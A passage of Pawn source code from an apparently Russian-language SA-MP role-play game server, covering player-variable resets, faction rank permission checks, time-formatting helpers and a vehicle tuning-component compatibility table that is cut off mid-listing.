	AcStruct[playerid][CheckMapTP] 					=
	PI[playerid][pSportExp] 						=
	PI[playerid][pBed] 								=
	PI[playerid][pZakon] 							=
	PI[playerid][pCheckCode] 						=
	PI[playerid][pWatch] 							=
	PI[playerid][pSprunk] 							=
	ChosenSkin[playerid] 							=
	SelectCharPlace[playerid] 						=
	PI[playerid][pPhoneBalance] 					=
	PlayerLogTries[playerid] 						=
	PlayerStats[playerid] 							=
	ClothesRound[playerid]							=
	HousePrice[playerid] 							=
	InShop[playerid] 								=
	InShopSkin[playerid] 							=
	DrivingTestTime[playerid]						=
	FlyTestTime[playerid]							=
	WaterTestTime[playerid]							=
	Oldskin2[playerid] 								=
	PI[playerid][pAdmin] 							=
	PI[playerid][pLeader] 							=
	PI[playerid][pTempLeader]                       =
	PI[playerid][pMember] 							=
	PI[playerid][pRank] 							=
	PI[playerid][pModel] 							=
	PI[playerid][pMemberSkin] 						=
	PI[playerid][pSex] 								=
	PI[playerid][pID] 								=
	PI[playerid][pWarn] 							=
	PI[playerid][pCash] 							=
	PI[playerid][pExp] 								=
    PI[playerid][pMuted] 							=
	PI[playerid][pAge] 								=
	PI[playerid][pBank] 							=
	PI[playerid][pNews] 							=
	PI[playerid][pJail] 							=
	PI[playerid][pJailTime] 						=
	PI[playerid][pWanted] 							=
	PI[playerid][pWantedTime] 						=
	PI[playerid][pDrugs] 							=
	PI[playerid][pPatron] 							=
	PI[playerid][pGunAmount] 						=
	PI[playerid][pCheckTime] 						=
	PI[playerid][pJob] 								=
	PI[playerid][pMarried] 							=
	PI[playerid][pPayCheck] 						=
	PI[playerid][pCharity] 							=
	PI[playerid][pVip] 								=
	PI[playerid][pVipTime]							=
	PI[playerid][pTime] 							=
	PI[playerid][pFightStyle] 						=
	PI[playerid][pCredits] 							=
	PI[playerid][pTotalCredits] 					=
	PI[playerid][pSkin][0] 							=
	PI[playerid][pSkin][1] 							=
	PI[playerid][pSkin][2] 							=
	PI[playerid][pZakon] 							=
	PI[playerid][pCheckCode] 						=
	PI[playerid][pMailConfirmed]                    =
	PI[playerid][pPhones]                           =
	PI[playerid][pPhoneNumber]                      =
	PI[playerid][pVoennik]                          =
	PI[playerid][pCredit]							=
	PI[playerid][pCreditMoney]						=
	PI[playerid][pCopter]							=
	PI[playerid][pCopterColor][0]					=
	PI[playerid][pCopterColor][1]					=
	PI[playerid][pCopter]							=
	PassInfo[playerid][psDateBirth][0] 				=
 	PassInfo[playerid][psDateBirth][1] 				=
 	PassInfo[playerid][psDateBirth][2] 				=
 	PassInfo[playerid][psDate][0] 					=
 	PassInfo[playerid][psDate][1] 					=
 	PassInfo[playerid][psDate][2] 					=
 	PassInfo[playerid][psCity] 						=
 	PassRegSex[playerid] 							=
 	PI[playerid][pSpawnChange]						=
 	Predlog[playerid]								=
    ZapretDice[playerid] 							=
    KostiMoney[playerid]							= 0;

	PI[playerid][P_IN_ENTRANCE]						=
	PI[playerid][P_SALON]							=
    PI[playerid][pInputCode]						=
    HouseOffer[playerid] 							=
    Mobile[playerid] 								=
	CellTime[playerid] 								=
	PlayerStats[playerid] 							=
	PassInfo[playerid][mcState] 					= -1;

    activemusic[playerid]                           =
    PlayerMusic[playerid]                           =
    StartGMTest[playerid]                           =
    ac_1{playerid}                                  =
    PlayerDied[playerid]                    		=
    CheckOutMoney[playerid]							=
    UseGPS[playerid] 								=
	PlayerFreezed[playerid]							=
	PlayerTied[playerid] 							=
	PlayerLogged[playerid] 							=
	AdminLogged[playerid] 							=
	TaxiON[playerid]                                =
	MedicON[playerid]                               =
	MechanicON[playerid]                            =
	PoliceON[playerid]                              =
	Ether[playerid] 								=
	EtherCall[0] 									=
	EtherCall[1] 									=
	EtherSms[0] 									=
	EtherSms[1] 									=
	EtherLive[playerid] 							=
	EtherCalled[playerid] 							= false;

	times[playerid] 								=
	Phone[playerid] 								= true;

	PI[playerid][P_SPEC_ADM]						=
	NameStats[playerid]                             =
	pCuff[playerid][pCuffer] 						=
	pCuff[playerid][pCuffee] 						=
    PI[playerid][Spectating][0] 					=
	PI[playerid][Spectating][1] 					=
	KostiName[playerid] 							= INVALID_PLAYER_ID;

	PI[playerid][P_AREND_SCOOTER]					=
	PI[playerid][P_OWNABLE_CAR][0]					=
	PI[playerid][P_OWNABLE_CAR][1]					=
	PI[playerid][P_OWNABLE_CAR][2]					=
	PI[playerid][P_OWNABLE_CAR][3]					=
	VehTest[playerid]                               =
	PI[playerid][TaxiCarID]                         =
	PI[playerid][BusCarID]                          =
	PI[playerid][MechanicCarID]                     =
	PI[playerid][SalonCarID]                        =
	PI[playerid][PlayerCopterID]					=
	PI[playerid][P_GRUZ_CAR]						=
	PI[playerid][P_LAST_VEHICLE]					= INVALID_VEHICLE_ID;

	PI[playerid][pColor]							= NONE_COLOR;
	PI[playerid][pSettings]                    		= 65535;
	PlayerArmour[playerid] 							= 0.0;
	PlayerLastTick[playerid] 						= GetTickCount();
	PI[playerid][pLevel] 							= 1;
	PI[playerid][pHealthS] 							= 100.0;
	PI[playerid][pHunger] 							= 50;

	PI[playerid][P_GNEWS_TIME]						=
	PI[playerid][P_ORDER_BIZ_ID]					=
	PI[playerid][P_ORDER_TIME]						=
	PI[playerid][P_ORDER_ID]						=
	PI[playerid][P_TUNING_TYPE]						=
	PI[playerid][pBusTime]							=
	PI[playerid][pBusID]							= -1;

	PI[playerid][pInteractionPlayer] 				= INVALID_PLAYER_ID;

	new i;
	/*for(i = 0; i < 14; i++) PI[playerid][pPresent][i] = 0;*/

	for(i = 0; i < 4; i++)
	{
    	g_player_skills[playerid][S_LICS][i] = 0;
 	    PI[playerid][pImprove][i] = 0;
 	    PI[playerid][pText][i] = 0;
	}
	for(i = 0; i < 7; i++)
	{
	    Settings[playerid][i] = 0;
	}
	for(i = 0; i < 8; i++)
	{
	    g_player_skills[playerid][S_GUN][i] = 0;
	    PhoneNumbers[playerid][i] = 0;
	}
	for(i = 0; i < 12; i++)
 	{
        PI[playerid][pGun][i] = 0;
		PI[playerid][pAmmo][i] = 0;
	}

	/* Конец */

	strmid(PlayerName[playerid], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	strmid(PI[playerid][pPassword], "", 0, strlen(PI[playerid][pPassword]), 32);
	strmid(PI[playerid][pMail], "", 0, strlen(PI[playerid][pMail]), 64);
	ResetPlayerWeapons(playerid);
	return 1;
}

stock SetHealth(playerid, Float: Heal)
{
	PlayerUseHeal[playerid] = 1;
	PI[playerid][pHeal] = Heal;
	SetPlayerHealth(playerid, Heal);
	PlayerUseHeal[playerid] = 0;
	return 1;
}

stock CarDoors(vehicleid, status)
{
	if(vehicleid == INVALID_VEHICLE_ID) return 0;
	new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	GetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
	SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, status, ebonnet, eboot, eobjective);
	if(vehicleid < lastveh) SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, false, ebonnet, eboot, eobjective);
	return 1;
}

stock CarDoorsEx(vehicleid, status)
{
	if(vehicleid == INVALID_VEHICLE_ID) return 0;
	new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	GetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
	SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, status, ebonnet, eboot, eobjective);
	return 1;
}

stock GetInflationPrice(money) return money;


stock GetPlayerGarage(playerid)
{
	new garage = 0;

	for(new i = TOTALGARAGES; i > 0; i --)
	{
		if(!strcmp(g_garages[i][G_OWNER], GetName(playerid), true))
		{
			garage = i;

			break;
		}
	}

	return garage;
}

stock GetPlayerHouse(playerid)
{
	new house = 0;
	for(new i = TOTALHOUSE; i > 0; i --)
	{
		if(!strcmp(HouseInfo[i][hOwner], GetName(playerid), true)) house++, SetPVarInt(playerid, "PlayerHouse", i);
	}
	return house;
}

stock GetPlayerBizz(playerid)
{
	new bizz = 0;
	for(new i = TOTALBIZZ; i > 0; i --)
	{
		if(!strcmp(BizzInfo[i][bOwner], GetName(playerid), true)) bizz++, SetPVarInt(playerid, "PlayerBizz", i);
	}
	return bizz;
}

stock IsTheMember(member)
{
	switch(member)
	{
		case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO,TEAM_POLICIA,TEAM_POLICIA2,TEAM_FBI,TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL,TEAM_ARMIYA,TEAM_SWAT,TEAM_AUTOSCHOOL,TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: return 1;
		default: return 0;
	}
	return 0;
}

stock IsThePayDayMembers(member)
{
	switch(member)
	{
		case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO,TEAM_POLICIA,TEAM_POLICIA2,TEAM_FBI,TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL,TEAM_ARMIYA,TEAM_AUTOSCHOOL,TEAM_SWAT,TEAM_OPG1,TEAM_RSM,TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: return 1;
		default: return 0;
	}
	return 0;
}

stock IsAbleToGosNewsRank(playerid) //ранги
{
	switch(PI[playerid][pMember])
	{
		case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_FBI: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_ARMIYA: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_AUTOSCHOOL: if(PI[playerid][pRank] >= 7) return 1;
		case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: if(PI[playerid][pRank] >= 9) return 1;
		default: return 0;
	}
	return 0;
}

stock IsAbleToInvite(playerid)
{
	switch(PI[playerid][pMember])
	{
	    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_FBI: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_ARMIYA: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_GROOVE,TEAM_BALLAS,TEAM_RIFA,TEAM_OPGTEST2,TEAM_VAGOS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_OPG1,TEAM_RSM: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_AUTOSCHOOL: if(PI[playerid][pRank] >= 7) return 1;
	}
	return 0;
}

stock IsAbleToUninvite(playerid)
{
    switch(PI[playerid][pMember])
	{
	    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_FBI: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_ARMIYA: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_GROOVE,TEAM_BALLAS,TEAM_RIFA,TEAM_OPGTEST2,TEAM_VAGOS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_OPG1,TEAM_RSM: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_AUTOSCHOOL: if(PI[playerid][pRank] >= 7) return 1;
	}
	return 0;
}

stock IsAbleToGiverank(playerid)
{
    switch(PI[playerid][pMember])
	{
	    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_FBI: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_ARMIYA: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_GROOVE,TEAM_BALLAS,TEAM_RIFA,TEAM_OPGTEST2,TEAM_VAGOS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_OPG1,TEAM_RSM: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: if(PI[playerid][pRank] >= 9) return 1;
		case TEAM_AUTOSCHOOL: if(PI[playerid][pRank] >= 7) return 1;
	}
	return 0;
}

stock IsAbleToZamFrac(playerid)
{
    switch(PI[playerid][pMember])
	{
	    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_FBI: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_ARMIYA: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_GROOVE,TEAM_BALLAS,TEAM_RIFA,TEAM_OPGTEST2,TEAM_VAGOS: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_OPG1,TEAM_RSM: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: if(PI[playerid][pRank] == 9) return 1;
		case TEAM_AUTOSCHOOL: if(PI[playerid][pRank] == 7) return 1;
	}
	return 0;
}

stock Convert(seconds, stringTo[], size = sizeof(stringTo))
{
	stringTo[0] = 0x0;
	new result[4];
	result[0] = floatround(seconds / (3600 * 24));
	result[1] = floatround(seconds / 3600);
	result[2] = floatround((seconds / 60) - (result[1] * 60));
	result[3] = floatround(seconds - ((result[1] * 3600) + (result[2] * 60)));
	switch(result[0])
	{
		case 0:
		{
			switch(result[1])
			{
				case 0: format(stringTo,size,"%02d:%02d",result[2],result[3]);
				default: format(stringTo,size,"%d:%02d:%02d",result[1],result[2],result[3]);
			}
		}
	}
	return stringTo;
}

stock Converts(number)
{
	new hours = 0, mins = 0, secs = 0, string[30];
	hours = floatround(number / 3600);
	mins = floatround((number / 60) - (hours * 60));
	secs = floatround(number - ((hours * 3600) + (mins * 60)));
	if(hours > 0) format(string, 30, "%d:%02d:%02d", hours, mins, secs);
	else format(string, 30, "%d:%02d", mins, secs);
	return string;
}

stock ConvertsCmdTime(number)
{
	new hours = 0, mins = 0, string[30];
	hours = number / 3600;
	mins = (number - hours * 3600) / 60;
	format(string, 30, "%d ч %d мин", hours, mins);
	return string;
}

stock GetXYInBackOfPlayer(const playerid, &Float:x, &Float:y, const Float:distance)
{
	new Float:a; GetPlayerPos(playerid, x, y, a); GetPlayerFacingAngle(playerid, a);
	if(IsPlayerInAnyVehicle(playerid))
	{
		new vid = GetPlayerVehicleID(playerid);
		if(vid > 0 && vid <= MAX_VEHICLES) GetVehicleZAngle(vid, a);
	}
	x -= (distance * floatsin(-a, degrees)); y -= (distance * floatcos(-a, degrees));
}

stock IsPlayerInInvalidNosVehicle(playerid)
{
    #define MAX_INVALID_NOS_VEHICLES 52
    static const InvalidNosVehicles[MAX_INVALID_NOS_VEHICLES] =
    {
		581,523,462,521,463,522,461,448,468,586,417,425,469,487,512,520,563,593,
		509,481,510,472,473,493,520,595,484,430,453,432,476,497,513,533,577,
		452,446,447,454,590,569,537,538,570,449,519,460,488,511,519,548,592
	};
	if(IsPlayerInAnyVehicle(playerid))
	{
		for(new i = 0; i < MAX_INVALID_NOS_VEHICLES; i++)
        {
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) == InvalidNosVehicles[i]) return 1;
		}
	}
	return 0;
}

stock IsComponentidCompatible(modelid, componentid)
{
    if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
         componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
         componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
         componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086)
         return 1;

    switch (modelid)
    {
        case 400: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 401: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 402: return (componentid == 1009 || componentid == 1009 || componentid == 1010);
        case 404: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 405: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000);
        case 409: return (componentid == 1009);
        case 410: return (componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 411: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 412: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 415: return (componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 418: return (componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016);
        case 419: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 420: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003);
        case 421: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000);
        case 422: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007);
        case 426: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003);
        case 429: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 436: return (componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 438: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 439: return (componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013);
        case 442: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 445: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 451: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 458: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 466: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 467: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 474: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 475: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 477: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 478: return (componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 479: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 480: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 489: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000);
        case 491: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 492: return (componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000);
        case 496: return (componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020);
        case 500: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 506: return (componentid == 1009);
        case 507: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 516: return (componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 517: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 518: return (componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 526: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 527: return (componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007);
        case 529: return (componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 533: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 534: return (componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106);
        case 535: return (componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119);
        case 536: return (componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108);
        case 540: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 541: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 542: return (componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015);
        case 545: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 546: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 547: return (componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000);
        case 549: return (componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 550: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003);
        case 551: return (componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003);
        case 555: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 558: return (componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093);
        case 559: return (componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009);
        case 560: return (componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031);
        case 561: return (componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057);
        case 562: return (componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039);
        case 565: return (componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048);
        case 566: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 567: return (componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133);
        case 575: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 576: return (componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134);
        case 579: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
